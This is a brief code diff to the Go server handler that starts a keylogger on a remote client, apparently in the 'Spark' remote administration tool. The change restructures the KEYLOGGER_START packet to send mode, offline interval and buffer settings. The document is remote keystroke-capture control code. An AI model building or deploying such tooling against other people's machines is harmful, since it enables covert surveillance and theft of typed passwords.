@@ -3,7 +3,6 @@ package keylogger
 import (
 	"Spark/modules"
 	"Spark/server/common"
-	"Spark/utils"
 	"encoding/json"
 	"fmt"
 	"net/http"
@@ -87,8 +86,12 @@ func startKeylogger(ctx *gin.Context) {
 	}
 
 	packet := modules.Packet{
-		Act:  "KEYLOGGER_START",
-		Data: config,
+		Act: "KEYLOGGER_START",
+		Data: gin.H{
+			"mode":            config.Mode,
+			"offlineInterval": config.OfflineInterval,
+			"maxBuffer":       config.MaxBuffer,
+		},
 	}
 
 	common.SendPackByUUID(packet, connUUID)
